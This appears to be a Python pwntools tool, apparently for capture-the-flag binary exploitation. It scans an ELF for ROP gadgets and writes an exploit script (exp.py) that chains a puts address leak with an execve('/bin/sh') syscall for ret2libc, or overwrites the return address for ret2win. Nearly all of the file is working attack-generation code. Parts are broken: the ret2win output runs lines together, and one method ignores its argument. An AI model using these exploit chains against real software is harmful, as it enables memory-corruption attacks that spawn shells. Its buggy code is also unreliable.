# pyright: reportMissingImports=false, reportUndefinedVariable=false 
from pwn import *

class GenBoilerplate():
	def __init__(self, properties):
		self.properties = properties

	def find_gadgets(self, elf):
		self.elfRop = ROP(elf)
		
		self.gadgetDict = {
			"pop rax" : None,
			"pop rbx" : None,
			"pop rcx" : None,
			"pop rdx" : None,
			"pop rdi" : None,
			"pop rsi" : None,
			"pop r8"  : None,
			"pop r9"  : None,
			"pop r10" : None,
			"pop r11" : None,
			"pop r12" : None,
			"pop r13" : None,
			"pop r14" : None,
			"pop r15" : None,
			"pop rbp" : None,
			"syscall" : None,
			"binsh"   : None,
			"putsplt" : None,
			"putsgot" : None,
			"main"    : None
		}

		for key in self.gadgetDict.keys():
			try:
				self.gadgetDict[key] = self.elfRop.find_gadget([key,'ret'])[0]
			except:
				pass

		try: 
			self.gadgetDict["binsh"] = list(self.elf.search(b"/bin/sh"))[0]
		except:
			pass
		
		try:
			self.gadgetDict["putsplt"] = self.elf.plt["puts"]
			self.gadgetDict["putsgot"] = self.elf.got["puts"]
			self.gadgetDict["main"] = self.elf.symbols["main"]
		except:
			pass
		
		return self.gadgetDict

	def add_gadget_to_exploit(self, gadget):
		self.exploitGadgets
		if gadget in self.gadgetDict.keys():
			if gadget not in self.exploitGadgets.keys():
				self.exploitGadgets[gadget] = self.gadgetDict[gadget]
		return

	def create_execve(self):
		self.gadgets = ["pop rax","pop rdi","pop rdx","pop rsi","binsh","syscall"]
		
		for gadget in self.gadgets:
			if self.gadgetDict[gadget] == None:
				return "# failed to create execve syscall\n"
		
		for item in self.gadgets:
			self.add_gadget_to_exploit(item)

		self.syscalls["execve"] = "poprdi + binsh + poprsi + p64(0) + poprdx + p64(0) + poprax + p64(59) + syscall"

		return

	def create_puts_leak(self):
		self.gadgets = ["pop rdi","putsplt","putsgot","main"]
		
		for gadget in self.gadgets:
			if self.gadgetDict[gadget] == None:
				return "# failed to create puts leak\n"
		
		for item in self.gadgets:
			self.add_gadget_to_exploit(item)
		
		self.syscalls["puts_leak"] = "poprdi + putsgot + putsplt + main"

		return

	def ret2libc(self):
		self.exploitGadgets = {}
		self.syscalls = {}

		#Broilerplate start code
		code = "from pwn import *\n\n"
		code += f"io = process(\"{self.properties['binary']}\")\n\n"
		code += f"padding = b\"A\"*{self.properties['offset']}\n\n"
		code += "#If you're looking for ROP gadgets from a leak insert your leak here\n"
		code += "leak = 0x0\n\n"

		self.gadgetDict = self.find_gadgets(self.elf)

		code += self.create_puts_leak() or ""

		code += self.create_execve() or ""

		for gadget in self.exploitGadgets.keys():
			code+= gadget.replace(" ","") + " = p64(leak + " + hex(self.exploitGadgets[gadget]) + ")\n"

		code+="\n"
		for call in self.syscalls.keys():
			code+=call + " = " + self.syscalls[call] + "\n"
		
		code += "\n"
		code += "io.sendline(padding+puts_leak)\n"
		code += "io.interactive()"

		f = open(f"exp.py", "w")
		f.write(code)
		log.info("Created an exploit boilerplate script. File name is: exp.py")
		f.close()

	def ret2win(self):
		code = "from pwn import *\n\n"
		code += f"io = process(\"{self.properties['binary']}\")\n\n"
		code += f"padding = b\"A\"*{self.properties['offset']}\n\n"
		code += "#If you're looking for ROP gadgets from a leak insert your leak here\n"
		code += "leak = 0x0\n\n"
		code += "# insert the address of the win function"
		code += f"win_addr = (leak + 0x0)"
		code += "io.sendline(padding+win_addr)"
		code += "io.interactive()"
		f = open(f"exp.py", "w")
		f.write(code)
		log.info("Created an exploit boilerplate script. File name is: exp.py")
		f.close()

	def main(self):
		self.elf = ELF(self.properties["binary"])

		if self.properties["pwn_type"] == "RET2LIBC":
			self.ret2libc()

		elif self.properties["pwn_type"] == "RET2WIN":
			self.ret2win()

		


